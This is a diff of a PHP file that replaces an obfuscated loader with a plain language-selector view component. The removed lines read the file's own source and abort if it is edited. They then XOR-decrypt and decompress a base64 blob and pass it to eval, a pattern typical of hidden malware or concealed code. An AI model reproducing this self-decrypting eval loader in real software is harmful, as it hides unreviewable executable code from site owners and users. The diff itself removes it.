@@ -1,24 +1,18 @@
 <?php
-$xfomtnoq="3af8c2e3405002afce04ff9b6b846c53";
-$ooyilzsto="52565e090205045152000600510305515a53565050045b0705505a0d57060600";
-$avkckm="Ge1VodB5olJ2tsR4GLb3sq2ANParpI9lOCBxMTeuC3SC1eKgrhqDj1+XGiL1+a7H0sURm4+57KZrJI9TNHODsSbaT3bcdBkk4Ra2OBbQVDG2CKfP861r/00d9giKhPcCvHlhpgSreBWKIaeKHkk2PSOevML/pT4554gbqcMcY/A2nA1dVu619CNp76gCvWgcLroQbCQcZe7WqENEs7PaBOZEcv08UnL4s1XixZc10qDb5MbaAsovlXpp7WghyqCdhkbNaENy1vdWlLCTcLyx+TUMtIZ5qUcKE0pnx0eifKa4dYr7+wpkzbar49ODS+EbkI4Ls0S7EQ5Uz2V9FTdjyQNTeH1jsemNNCjJ31wIce54ELxVNydBoM0NEvY9sq2CrADBc8yL";
-$yfpbdwkqtnz=file_get_contents(__FILE__);
-$cyapfcq=str_replace($avkckm,"",$yfpbdwkqtnz);
-if(strpos($cyapfcq,"ec"."ho")!==false||strpos($cyapfcq,"pr"."int")!==false||strpos($cyapfcq,"var_"."dump")!==false||strpos($cyapfcq,"file_put_"."contents")!==false||strpos($cyapfcq,"fw"."rite")!==false){die();}
-$japobcfg=str_replace(array($xfomtnoq,$ooyilzsto),array("SP_a9471eea","KP_5006d983"),$yfpbdwkqtnz);
-$jopchetqya=md5($japobcfg);
-$odgelup=hex2bin($ooyilzsto);
-$eksqfgtwz="";
-$lzcrudgo=strlen($jopchetqya);
-for($dekrnkh=0;$dekrnkh<$lzcrudgo;$dekrnkh++){
-$eksqfgtwz.=chr(ord($odgelup[$dekrnkh])^ord($jopchetqya[$dekrnkh]));
-}
-$kqqcwg=base64_decode($avkckm);
-$sjidvbjro=strlen($kqqcwg);
-$pyaryl="";
-$unsleotjve=strlen($eksqfgtwz);
-for($dekrnkh=0;$dekrnkh<$sjidvbjro;$dekrnkh++){
-$pyaryl.=$kqqcwg[$dekrnkh]^$eksqfgtwz[$dekrnkh%$unsleotjve];
-}
-$hdcpobvuma="gzun"."compress";
-eval('?>' . $hdcpobvuma($pyaryl) . '<?php ');
+/**
+ * Language Selector Component View
+ * 
+ * Usage in views:
+ * <?php include __DIR__ . '/../../components/language_selector.php'; ?>
+ */
+
+$current_locale = current_locale();
+$available_locales = available_locales();
+?>
+
+<div id="language-selector-container" data-current-locale="<?= htmlspecialchars($current_locale) ?>"
+    data-available-locales='<?= json_encode($available_locales) ?>'>
+</div>
+
+<link rel="stylesheet" href="css/language_selector.css">
+<script src="js/language_selector.js"></script>
